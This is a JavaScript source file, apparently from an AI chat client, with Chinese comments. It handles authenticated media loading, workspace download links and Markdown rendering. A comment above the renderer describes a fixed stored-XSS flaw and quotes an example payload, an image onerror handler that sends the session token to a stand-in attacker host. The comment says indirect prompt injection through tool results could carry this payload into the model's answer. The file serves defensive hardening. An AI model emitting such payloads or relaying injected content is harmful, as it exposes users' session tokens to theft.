/* =========================================================================
   受保护媒体的加载（<img>/<audio> 发不了 Authorization 头）
   ========================================================================= */
const MEDIA_BLOB_CACHE = new Map();   // url -> { promise, objectUrl }
const MEDIA_BLOB_CACHE_MAX = 40;

/**
 * 同一个 URL 只取一次，重新渲染出来的新节点直接复用 objectURL。
 * 失败不入缓存（下次重试），并删掉自己占的位置。
 */
function protectedMediaBlob(url) {
    const cached = MEDIA_BLOB_CACHE.get(url);
    if (cached) return cached.promise;
    const entry = { promise: null, objectUrl: null };
    MEDIA_BLOB_CACHE.set(url, entry);
    entry.promise = fetch(url, { credentials: 'same-origin' })
        .then(resp => {
            if (!resp.ok) throw new Error('HTTP ' + resp.status);
            return resp.blob();
        })
        .then(blob => {
            entry.objectUrl = URL.createObjectURL(blob);
            return entry.objectUrl;
        })
        .catch(err => {
            MEDIA_BLOB_CACHE.delete(url);
            throw err;
        });
    evictMediaBlobCache();
    return entry.promise;
}

function evictMediaBlobCache() {
    while (MEDIA_BLOB_CACHE.size > MEDIA_BLOB_CACHE_MAX) {
        const [oldUrl, old] = MEDIA_BLOB_CACHE.entries().next().value;
        MEDIA_BLOB_CACHE.delete(oldUrl);
        if (old.objectUrl) URL.revokeObjectURL(old.objectUrl);
    }
}

/** 把 root 下所有 data-auth-src 元素挂上真实 src。 */
function hydrateProtectedMedia(root) {
    if (!root || !root.querySelectorAll) return;
    root.querySelectorAll('[data-auth-src]').forEach(el => {
        const url = el.getAttribute('data-auth-src');
        if (!url) return;
        el.removeAttribute('data-auth-src');   // 同一节点只排队一次
        protectedMediaBlob(url).then(objectUrl => {
            // 流式重绘可能已经把节点换掉了，别往废弃节点上写
            if (el.isConnected) el.src = objectUrl;
        }).catch(err => {
            el.setAttribute('data-media-error', '1');
            console.warn('受保护媒体加载失败:', url, err.message);
        });
    });
}

/* 流式渲染、历史回放、整段重画都会新建节点 —— 用观察器统一接管，免得到处记得调用。 */
(function observeProtectedMedia() {
    const start = () => {
        hydrateProtectedMedia(document.body);
        new MutationObserver(mutations => {
            mutations.forEach(m => m.addedNodes.forEach(node => {
                if (node.nodeType !== 1) return;
                hydrateProtectedMedia(node.hasAttribute && node.hasAttribute('data-auth-src')
                    ? node.parentNode : node);
            }));
        }).observe(document.body, { childList: true, subtree: true });
    };
    if (document.body) start();
    else document.addEventListener('DOMContentLoaded', start);
})();

function parseBracketImg(s, label) {
    const needle = '[' + label + '](';
    let out = '', i = 0;
    while (i < s.length) {
        const p = s.indexOf(needle, i);
        if (p === -1) { out += s.slice(i); break; }
        out += s.slice(i, p);
        const u = balancedUrl(s, p + needle.length - 1);
        if (!u) { out += s[p]; i = p + 1; continue; }
        const url = u.url.replace(/&amp;/g, '&');
        if (!/^https?:\/\//i.test(url)) { out += s.slice(p, u.end + 1); i = u.end + 1; continue; }
        out += `<img src="${escA(url)}" alt="${escA(label)}" referrerpolicy="no-referrer" loading="lazy">`;
        i = u.end + 1;
    }
    return out;
}

/** 把 write_file 回报的 workspace/扁平文件路径换成受认证的下载 URL。 */
function workspaceDownloadPath(href) {
    const match = String(href).match(/^workspace\/([^/?#]+)$/i);
    if (!match) return null;
    let name;
    try { name = decodeURIComponent(match[1]); } catch (_) { return null; }
    if (!name || name.startsWith('.') || name.includes('..') || /[\/\\\x00-\x1f]/.test(name)) return null;
    return encodeURIComponent(name).replace(/%2E/gi, '.').replace(/%2D/gi, '-').replace(/%5F/gi, '_');
}

/**
 * 下载地址上的会话参数。
 *
 * 会话可以绑定自己的工作目录，文件就不在默认工作区里了；不带 sid 时端点只能在
 * {数据根}/workspace 下找，链接必然 404。没有当前会话时不加参数（等同于默认工作区）。
 */
function workspaceSidQuery() {
    return currentId ? '?sid=' + encodeURIComponent(currentId) : '';
}

/** 回复常把 write_file 返回的 workspace/文件名作为普通文本，而非 Markdown 链接。 */
function linkWorkspacePaths(s) {
    const text = String(s);
    const protectedRanges = [];
    // 已有 Markdown 链接的 label/url 以及图片语法不可再改写，否则会嵌套出错误链接。
    const markdownLink = /!?\[[^\]]*\]\([^)]*\)/g;
    let existing;
    while ((existing = markdownLink.exec(text)) !== null) {
        protectedRanges.push([existing.index, existing.index + existing[0].length]);
    }
    const pathPattern = /(^|[\s:：])workspace\/([^\s<>"'`()（）]+)(?=$|[\s),，。；;）])/g;
    const sourceLines = text.split('\n');
    let lineStart = 0;
    const candidates = [];
    for (const line of sourceLines) {
        const heading = /(^|[\s:：])(workspace\/[^\s<>"'`()（）]+)(?=$|[\s),，。；;（）])/g;
        let item;
        while ((item = heading.exec(line)) !== null) {
            const start = lineStart + item.index + item[1].length;
            const end = start + item[2].length;
            if (!protectedRanges.some(range => start >= range[0] && start < range[1])) {
                candidates.push({ start, end, token: item[2] });
            }
        }
        lineStart += line.length + 1;
    }
    let out = '', cursor = 0;
    for (const candidate of candidates) {
        const href = workspaceDownloadPath(candidate.token);
        if (!href) continue;
        let displayName = candidate.token.slice('workspace/'.length);
        try { displayName = decodeURIComponent(displayName); } catch (_) { }
        out += text.slice(cursor, candidate.start) + '[' + candidate.token.slice(0, 'workspace/'.length) + displayName
            + '](workspace/' + href + ')';
        cursor = candidate.end;
    }
    return cursor ? out + text.slice(cursor) : text;
}

function parseLinks(s) {
    let out = '', i = 0;
    while (i < s.length) {
        const lb = s.indexOf('[', i);
        if (lb === -1) { out += s.slice(i); break; }
        if (lb > 0 && s[lb - 1] === '!') { out += s.slice(i, lb + 1); i = lb + 1; continue; }
        out += s.slice(i, lb);
        const rb = s.indexOf(']', lb + 1);
        if (rb === -1 || s[rb + 1] !== '(') { out += s[lb]; i = lb + 1; continue; }
        const txt = s.slice(lb + 1, rb);
        const u = balancedUrl(s, rb + 1);
        if (!u) { out += s[lb]; i = lb + 1; continue; }
        const href = u.url.replace(/&amp;/g, '&');
        const workspacePath = workspaceDownloadPath(href);
        if (workspacePath) {
            const downloadUrl = '/api/workspace-download/' + workspacePath + workspaceSidQuery();
            let downloadName = workspacePath;
            try { downloadName = decodeURIComponent(workspacePath); } catch (_) { }
            out += `<a href="#" data-auth-download="${escA(downloadUrl)}" data-download-name="${escA(downloadName)}" class="workspace-download-link" rel="nofollow">${txt}</a>`;
        } else if (!/^https?:\/\//i.test(href) && !/^\/\w/.test(href)) {
            out += s.slice(lb, u.end + 1);
        } else {
            out += `<a href="${escA(href)}" target="_blank" rel="noopener">${txt}</a>`;
        }
        i = u.end + 1;
    }
    return out;
}

/**
 * Markdown → HTML。
 *
 * 安全前提（顺序不可调换）：先全文 HTML 转义，再做结构化标记。
 *
 * 旧实现直接对原文跑正则并把 `$1` 拼进 HTML，只有 fenced code 走了 esc()，
 * 于是模型答案里的 `<img src=x onerror="fetch('//attacker/?t='+sessionStorage.ma_token)">`
 * 会原样进入 innerHTML —— 答案会落库，所以是**存储型** XSS：每次重新打开该会话都再次执行，
 * 而同源下可读走会话令牌。工具结果（网页正文、文件内容、MCP 输出）都能被复述进答案，
 * 因此攻击者不必是受害者本人（间接提示注入即可）。
 *
 * 现在固定为四步：摘出代码块 → 全文转义 → 结构化替换（插值已是转义文本）→ 还原代码块。
 * 任何新增规则都必须落在这条顺序里，不得再插入未转义的原文。
 */
function renderMD(t) {
    if (t == null) return '';
    t = String(t);

    // 1) 摘出 fenced code：内容不参与 markdown 结构替换，也不会被二次转义
    const codeBlocks = [];
    t = t.replace(/```(\w*)\n([\s\S]*?)```/g, (_, lang, code) => {
        codeBlocks.push({ lang: lang || 'code', code: code });
        return '\u0000CB' + (codeBlocks.length - 1) + '\u0000';
    });

    // 2) 全文转义：此后所有 $1 插值都是安全文本
    t = esc(t);

    t = t.replace(/`([^`]+)`/g, '<code>$1</code>');
    t = t.replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>');
    t = t.replace(/\*(.+?)\*/g, '<em>$1</em>');
    t = t.replace(/^### (.+)$/gm, '<h3>$1</h3>');
    t = t.replace(/^## (.+)$/gm, '<h2>$1</h2>');
    t = t.replace(/^# (.+)$/gm, '<h1>$1</h1>');
    t = t.replace(/^---$/gm, '<hr>');

    // 引用块：> text（转义后行首是 &gt;，支持多行连续引用）
    t = t.replace(/(^&gt; .+$\n?)+/gm, m => {
        const inner = m.replace(/^&gt; /gm, '').trim();
        return `<blockquote>${inner}</blockquote>`;
    });

    // 表格：| header | header |\n|---|---|\n| cell | cell |
    t = t.replace(/(^(\|.+\|)\n(\|[-:| ]+\|)\n((\|.+\|)\n?)*)/gm, m => {
        const rows = m.trim().split('\n').filter(r => r.trim());
        if (rows.length < 2) return m;
        // 检测分隔行
        const sepIdx = rows.findIndex(r => /^\|[-:| ]+\|$/.test(r.trim()));
        if (sepIdx < 0) return m;
        const headerRows = rows.slice(0, sepIdx);
        const bodyRows = rows.slice(sepIdx + 1);
        function parseCells(line) {
            return line.split('|').slice(1, -1).map(c => c.trim());
        }
        let html = '<table><thead>';
        headerRows.forEach(r => {
            html += '<tr>' + parseCells(r).map(c => `<th>${c}</th>`).join('') + '</tr>';
        });
        html += '</thead><tbody>';
        bodyRows.forEach(r => {
            html += '<tr>' + parseCells(r).map(c => `<td>${c}</td>`).join('') + '</tr>';
        });
        html += '</tbody></table>';
        return html;
    });

    t = parseMediaBang(t);
    t = parseBracketImg(t, '图片');
    t = linkWorkspacePaths(t);
    t = parseLinks(t);
    t = t.replace(/^- (.+)$/gm, '<li>$1</li>');
    t = t.replace(/^\d+\. (.+)$/gm, '<li>$1</li>');
    t = t.replace(/(<li>[\s\S]*?<\/li>\n?)+/g, m => `<ul>${m}</ul>`);
    t = t.replace(/\n\n+/g, '</p><p>');
    t = t.replace(/\n/g, '<br>');
    // 清理多余的 <br> 紧跟块元素
    t = t.replace(/<br>(<\/?(h[1-3]|ul|ol|li|blockquote|table|thead|tbody|tr|th|td|pre|hr)[^>]*>)/gi, '$1');
    t = t.replace(/(<\/?(h[1-3]|ul|ol|li|blockquote|table|thead|tbody|tr|th|td|pre|hr)[^>]*>)<br>/gi, '$1');

    // 4) 还原代码块：内容转义；语言名只保留 [\w-] 再拼进 class，避免属性逃逸
    t = t.replace(/\u0000CB(\d+)\u0000/g, (_, idx) => {
        const b = codeBlocks[Number(idx)];
        if (!b) return '';
        const lang = String(b.lang).replace(/[^\w-]/g, '') || 'code';
        return `<pre><div class="code-hdr"><span>${esc(b.lang)}</span>`
            + `<button class="code-copy" onclick="copyCode(this)"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>复制</button></div>`
            + `<code class="lang-${lang}">${esc(b.code)}</code></pre>`;
    });

    if (!t.startsWith('<')) t = '<p>' + t + '</p>';
    return t;
}

function copyCode(btn) {
    const code = btn.closest('pre').querySelector('code');
    navigator.clipboard.writeText(code.innerText).then(() => {
        btn.innerHTML = '<svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" width="12" height="12"><path d="M20 6L9 17l-5-5"/></svg>已复制';
        setTimeout(() => {
            btn.innerHTML = '<svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" width="12" height="12"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>复制';
        }, 2000);
    });
}

